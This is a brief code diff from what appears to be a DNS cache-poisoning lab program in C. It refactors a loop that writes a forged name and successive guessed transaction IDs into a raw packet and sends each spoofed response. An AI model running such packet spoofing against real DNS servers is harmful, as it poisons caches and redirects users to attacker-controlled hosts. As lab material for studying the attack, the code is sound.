@@ -32,11 +32,11 @@ int main()
   // Modify the name in the answer field (offset=64)
   memcpy(ip+64, "bbbbb" , 5); 
 
-  for (int guess=1; guess<100; guess++){
+  for (int id=1; id<100; id++){
      // Modify the transaction ID field (offset=28)
-     unsigned short id[2];
-     *id = htons(guess);
-     memcpy(ip+28, (void *) id, 2); 
+     unsigned short id_net_order;
+     id_net_order = htons(id);
+     memcpy(ip+28, &id_net_order, 2); 
 
      // Send the IP packet out
      send_packet_raw(sock, ip, n);
